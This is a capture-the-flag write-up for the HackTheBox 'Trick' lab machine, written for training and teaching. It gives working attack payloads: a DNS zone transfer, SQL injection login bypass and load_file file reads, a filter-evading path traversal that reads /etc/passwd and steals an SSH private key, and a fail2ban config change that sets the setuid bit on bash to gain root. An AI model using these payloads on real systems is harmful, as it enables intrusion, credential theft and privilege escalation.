+++
title = "HackTheBox - Trick"
tags = [
    "ctf"
]
date = "2022-09-11"
toc = true
+++

# Premise

`Trick` is machine challenge that presents itself initially as an incomplete website - from there we need to perform various types of enumeration, avoid rabbitholes, and use some classic vulnerabilities to get our flags!

# Recon

If we hit the challenge's IP directly we get a totally non-functional website. There are initial references to a bootstrap form url (just `https://startbootstrap/<stuff here>`) however this will go nowhere - this is just poor documentation on the bootstrap side I think, as it should have `.com` on the end. Nothing else to see here, and fuzzing the IP for other endpoints/subdirs will go nowhere. The only other basic enumeration that we get from here is that we're accessing an Nginx 1.14.2 server - this will be helpful information later.

A quick `nmap` scan will show us that TCP 22, 25, 53, and 80 are open - SSH, SMTP, DNS, and HTTP respectively. What stands out here is that we've got a DNS server running - right away I'm thinking we can use that to find out other hostnames for the machine. Let's do a reverse lookup:

```
dig -x $target @$target

; <<>> DiG 9.10.6 <<>> -x 10.129.66.216 @10.129.66.216
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 32934
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;216.66.129.10.in-addr.arpa.    IN      PTR

;; ANSWER SECTION:
216.66.129.10.in-addr.arpa. 604800 IN   PTR     trick.htb.

;; AUTHORITY SECTION:
66.129.10.in-addr.arpa. 604800  IN      NS      trick.htb.

;; ADDITIONAL SECTION:
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1

;; Query time: 24 msec
;; SERVER: 10.129.66.216#53(10.129.66.216)
;; WHEN: Sun Sep 11 06:12:05 EDT 2022
;; MSG SIZE  rcvd: 136
```

Ok, we have an initial domain! Let's plug it into `/etc/hosts` and... Oh, that's not useful for much, it's the same content.

What if we try a zone transfer attack to see what else the nameserver handles?

```
dig axfr @$target trick.htb

; <<>> DiG 9.10.6 <<>> axfr @10.129.54.230 trick.htb
; (1 server found)
;; global options: +cmd
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
trick.htb.              604800  IN      NS      trick.htb.
trick.htb.              604800  IN      A       127.0.0.1
trick.htb.              604800  IN      AAAA    ::1
preprod-payroll.trick.htb. 604800 IN    CNAME   trick.htb.
trick.htb.              604800  IN      SOA     trick.htb. root.trick.htb. 5 604800 86400 2419200 604800
;; Query time: 19 msec
;; SERVER: 10.129.54.230#53(10.129.54.230)
;; WHEN: Sat Sep 10 21:38:37 EDT 2022
;; XFR size: 6 records (messages 1, bytes 203)
```

That's more like it! After updating `/etc/hosts` to include `preprod-paywall.trick.htb` we've got a new website being served up.

# Lovely Filter Inclusions

Once we get to the Payroll site, we are met with a login page that we don't have credentials for. Fortunately it's vulnerable to some basic SQLi - a username of `admin' or 1=1; -- ` will get us right in,

Poking around from here for SSTI or other possible PHP vulns doesn't get too far, however XSS/HTML injection is possible in a few places, including the `Name` field on the `Users` tab of this interface. I spent a good 2 hours here before finally giving up on it... it turns out this was a complete rabbithole. RFI/RCE is not possible here, and anything you can dump via XSS on it is basically useless.

Where we do get some traction here is in the other tabs - one of interest is the `Employee` tab where we see this as the main content:

```
  <script type="text/javascript">
    $(document).ready(function(){

      

      
      $('.edit_employee').click(function(){
        var $id=$(this).attr('data-id');
        uni_modal("Edit Employee","manage_employee.php?id="+$id)
        
      });
      $('.view_employee').click(function(){
        var $id=$(this).attr('data-id');
        uni_modal("Employee Details","view_employee.php?id="+$id,"mid-large")
        
      });
      $('#new_emp_btn').click(function(){
        uni_modal("New Employee","manage_employee.php")
      })
      $('.remove_employee').click(function(){
        _conf("Are you sure to delete this employee?","remove_employee",[$(this).attr('data-id')])
      })
    });
    function remove_employee(id){
      start_load()
      $.ajax({
        url:'ajax.php?action=delete_employee',
        method:"POST",
        data:{id:id},
        error:err=>console.log(err),
        success:function(resp){
            if(resp == 1){
              alert_toast("Employee's data successfully deleted","success");
                setTimeout(function(){
                location.reload();

              },1000)
            }
          }
      })
    }`
```

At face value this just shows that the page will open some modals/pop-ups, which it does when we click on certain buttons, but the real interest here is that `+$id` parameter that's being added on... Smells like a SQLi opportunity.

Sure enough, after fuzzing it with a few payloads, we can do a union select with it.

```
http://preprod-payroll.trick.htb/manage_employee.php?id=1%20union%20select%201,2,3,4,5,6,7,8
```

This doesn't give us anything, but since we know it's vulnerable we can move on to more fun [like using it for LFI/RFI](https://infosecwriteups.com/sql-injection-with-load-file-and-into-outfile-c62f7d92c4e2):

```
http://preprod-payroll.trick.htb/manage_employee.php?id=1%20union%20select%201,2,load_file(%27/etc/passwd%27),4,5,6,7,8
```

And look at that, we've replaced one of the parts of data returned with the `/etc/passwd` file:

```
root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologinsystemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologinsystemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologinsystemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologinmessagebus:x:104:110::/nonexistent:/usr/sbin/nologintss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/falsednsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologinusbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologinrtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologinpulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologinspeech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/falseavahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologinsaned:x:112:121::/var/lib/saned:/usr/sbin/nologincolord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologingeoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologinhplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/falseDebian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/falsesystemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologinmysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/falsesshd:x:118:65534::/run/sshd:/usr/sbin/nologinpostfix:x:119:126::/var/spool/postfix:/usr/sbin/nologinbind:x:120:128::/var/cache/bind:/usr/sbin/nologinmichael:x:1001:1001::/home/michael:/bin/bash
```

Let's save this for later, but the key thing of interest here is that we can pull _some_ content from the local filesystem.

At this point I slammed my head against the wall trying to do further enumeration for another hour or so, and eventually took a look at the HTB Forum thread on this. Unfortunately, this spoiled things a bit for me (I was able to guess the other hostname based on `pre****-mar******` being in a comment), but I went back after to do some more digging on it!

# Enabled and Available

Earlier I mentioned that the server responses confirmed we're running Nginx. This means we _likely_ have a few static file locations we can look at. Since we have RFI here, let's try pulling some.

We can get the nginx `access.log` file - `view-source:http://preprod-payroll.trick.htb/manage_employee.php?id=1%20union%20select%201,2,load_file(%27/var/log/nginx/access.log%27),4,5,6,7,8`. This could actually provide you with some good content on a shared box, but I'm on a VIP instance so I can only see my own traffic - you might get one of the other hostnames leaked here if not using VIP which would be a nice win and honestly a good "real world" example of how this could work.

Another file we can look at for enumeration is `/etc/nginx/sites-available/default`:

```
server {
  listen 80 default_server;
  listen [::]:80 default_server;
  server_name trick.htb;
  root /var/www/html;

  index index.html index.htm index.nginx-debian.html;

  server_name _;

  location / {
    try_files $uri $uri/ =404;
  }

  location ~ \.php$ {
    include snippets/fastcgi-php.conf;
    fastcgi_pass unix:/run/php/php7.3-fpm.sock;
  }
}


server {
  listen 80;
  listen [::]:80;

  server_name preprod-marketing.trick.htb;

  root /var/www/market;
  index index.php;

  location / {
    try_files $uri $uri/ =404;
  }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm-michael.sock;
        }
}

server {
        listen 80;
        listen [::]:80;

        server_name preprod-payroll.trick.htb;

        root /var/www/payroll;
        index index.php;

        location / {
                try_files $uri $uri/ =404;
        }

        location ~ \.php$ {
                include snippets/fastcgi-php.conf;
                fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        }
}
```

Well look at that, we have another hostname that wasn't there in the zone transfer - `preprod-marketing.trick.htb`. Let's add that to the ol' `/etc/hosts` file and move over to it.

# The classics

Marketing's website is where this becomes a bit more basic, thankfully, as the enumeration up to this point has been more difficult than I had expected given the challenge's rating.

The main thing to take note of on the marketing page is that the page seems to be running off of PHP `incloude`s, whereas the payroll site was using nav anchors to load content. This means we can _probably_ use some basic path traversal, though it may need to get somewhat obfuscated as many challenges (and of course real world scenarios) will filter this either with application code or a WAF):

`http://preprod-marketing.trick.htb/index.php?page=about.html` isn't of any use to us, but what about `http://preprod-marketing.trick.htb/index.php?page=../../../../../../etc/passwd`? Well, no, sadly. Maybe if we tweak that a bit further?

`http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin _apt:x:100:65534::/nonexistent:/usr/sbin/nologin systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin messagebus:x:104:110::/nonexistent:/usr/sbin/nologin tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin rtkit:x:108:114:RealtimeKit,,,:/proc:/usr/sbin/nologin pulse:x:109:118:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin saned:x:112:121::/var/lib/saned:/usr/sbin/nologin colord:x:113:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin geoclue:x:114:123::/var/lib/geoclue:/usr/sbin/nologin hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false Debian-gdm:x:116:124:Gnome Display Manager:/var/lib/gdm3:/bin/false systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin mysql:x:117:125:MySQL Server,,,:/nonexistent:/bin/false sshd:x:118:65534::/run/sshd:/usr/sbin/nologin postfix:x:119:126::/var/spool/postfix:/usr/sbin/nologin bind:x:120:128::/var/cache/bind:/usr/sbin/nologin michael:x:1001:1001::/home/michael:/bin/bash
```

That looks familiar, but, ugh, we could already get this with the SQLi from earlier... maybe we're running as a different user for this site? We can't get `/etc/shadow` so we're probably not `root`, but maybe we're the `michael` user (or someone with access to their home)? They seem to be the only user on the box...

One `GET` to `http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//home/michael/user.txt` and we have our first flag! Woohoo!

# Get a grip (or a foothold)

Next step, let's get on this box. Fortunately `michael` is kind enough to have his private key in its default location, and it can be used for ssh:

```
$ curl -o id_rsa http://preprod-marketing.trick.htb/index.php?page=....//....//....//....//....//....//....//....//home/michael/.ssh/id_rsa
$ chmod 0600 id_rsa
$ ssh -i id_rsa michael@trick.htb
Linux trick 4.19.0-20-amd64 #1 SMP Debian 4.19.235-1 (2022-03-17) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
michael@trick:~$
```

# Do you prefer taking the elevator or the escalator?

Now that we've got reliable access we can try to get `root` access. We can start out by [running `linpeas` to see if we have anything interesting](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS).

One thing that pops up a lot in the output here is that we've running `fail2ban` (non-default, which is why it stands out) and _the `/etc/fail2ban/action.d` directory is writeable for our current user. The other thing that makes this really stand out as either a deliberate rabbithole, or our path to root, is that we also happen to have the ability to restart the `fail2ban` service as our _only_ `NOPASSWD` `sudo` privilege:

```
 (root) NOPASSWD: /etc/init.d/fail2ban restart
```

`fail2ban` is a great application in that it can be used to block IPs via iptables, or perform _other arbitrary actions_ when a given scenario is hit. A simple example is that if we multiple SSH failures are detected from an IP, `fail2ban` will block access from that IP via `iptables` for a set period of time. 

In this challenge, the situation above is exactly how it works, and it's set for a period of 10 seconds. Sure enough, it's also running as `root` so we can do whatever we want with this service as long as we can modify the config:

```
michael@trick:/dev/shm$ ps aux |grep fail2ban
root        729  0.0  1.0 248664 20580 ?        Ssl  12:10   0:01 /usr/bin/python3 /usr/bin/fail2ban-server -xf start
```

One quick overwrite of `/etc/fail2ban/action.d/iptables-multiport.conf` to ironically change `actionban` from blocking our IP to making `/bin/bash` a `setuid` variable with `chmod +s /bin/bash`, a restart of `fail2ban`, and after a few failed SSH attempts with a junk password:

```
michael@trick:/etc/fail2ban/action.d$ ls -la /bin/bash
-rwxr-xr-x 1 root root 1168776 Apr 18  2019 /bin/bash

michael@trick:/etc/fail2ban/action.d$ ls -la /bin/bash
-rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash

michael@trick:/etc/fail2ban/action.d$ /bin/bash -p
bash-5.0# whoami
root
```

Note: Updating `/bin/bash` to have the `setuid` bit is just one of many possible solutions here. A reverse shell, other permission changes, etc... are all equally valid solutions.

GG!

